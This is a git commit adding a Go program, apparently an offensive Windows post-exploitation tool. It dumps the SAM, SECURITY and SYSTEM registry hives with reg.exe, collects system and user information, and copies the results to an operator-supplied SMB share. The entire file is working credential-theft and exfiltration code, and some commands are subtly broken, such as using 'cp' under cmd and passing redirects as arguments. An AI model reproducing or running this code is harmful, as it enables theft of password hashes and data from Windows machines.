d0469ce1cbbd9c4e62bb8d13a282a5ecbbf5f077
kymb0 <55473161+kymb0@users.noreply.github.com>
2021-03-02 10:52:24 +0930

    Create basic_win_exfil.go

---
+++ basic_win_exfil.go
@@ -0,0 +1,79 @@
+package main
+
+import(
+    "fmt"
+    "os/exec"
+)
+
+func main() {
+
+    var smb string
+
+    fmt.Print("Where should we send tha l00tz? (UNC path of your SMB server EG \\\\10.13.3.7\\\\GUEST): ")
+    fmt.Scanf("%s", &smb)
+    fmt.Println("Will copy l00t to ", smb)
+
+	fmt.Print("[*] Attempting to create C:\\dump_temp")
+
+	d := exec.Command("cmd", "/C", "mkdir", "C:\\dump_temp")
+    if err := d.Run(); err != nil { 
+        fmt.Println("[!] Error: ", err)
+    }   else {
+		fmt.Println("[*] C:\\dump_temp created succesfully!")
+	}
+
+	fmt.Print("[*] Attempting to dump sam")
+
+	s1 := exec.Command("reg.exe", "save", "hklm\\sam", "c:\\dump_temp\\sam.save")
+    if err := s1.Run(); err != nil { 
+        fmt.Println("[!] Error: ", err)
+    }   else {
+		fmt.Println("[*] sam dumped succesfully!")
+	}
+
+	fmt.Print("[*] Attempting to dump sam")
+
+	s2 := exec.Command("reg.exe", "save", "hklm\\security", "c:\\dump_temp\\security.save")
+    if err := s2.Run(); err != nil { 
+        fmt.Println("[!] Error: ", err)
+    }   else {
+		fmt.Println("[*] security dumped succesfully!")
+	}
+
+	fmt.Print("[*] Attempting to dump sam")
+
+	s3 := exec.Command("reg.exe", "save", "hklm\\system", "c:\\dump_temp\\system.save")
+    if err := s3.Run(); err != nil { 
+        fmt.Println("[!] Error: ", err)
+    }   else {
+		fmt.Println("[*] system dumped succesfully!")
+	}
+
+	fmt.Print("[*] Collecting Systeminfo")
+
+	s4 := exec.Command("cmd", "/c", "systeminfo", ">", "sysinfo.txt")
+    if err := s4.Run(); err != nil { 
+        fmt.Println("[!] Error: ", err)
+    }   else {
+		fmt.Println("[*] Collecting Systeminfo succesfull!")
+	}
+
+	fmt.Print("[*] Collecting users")
+
+	s5 := exec.Command("cmd", "/c", "net user", ">", "users.txt")
+    if err := s5.Run(); err != nil { 
+        fmt.Println("[!] Error: ", err)
+    }   else {
+		fmt.Println("[*] Collecting users succesfull!")
+	}
+
+	fmt.Print("[*] Sending to share")
+
+	s6 := exec.Command("cmd", "/c", "cp", "c:\\dump_temp\\*", smb)
+    if err := s6.Run(); err != nil { 
+        fmt.Println("[!] Error: ", err)
+    }   else {
+		fmt.Println("[*] Exfiltration succesfull!")
+	}
+
+}
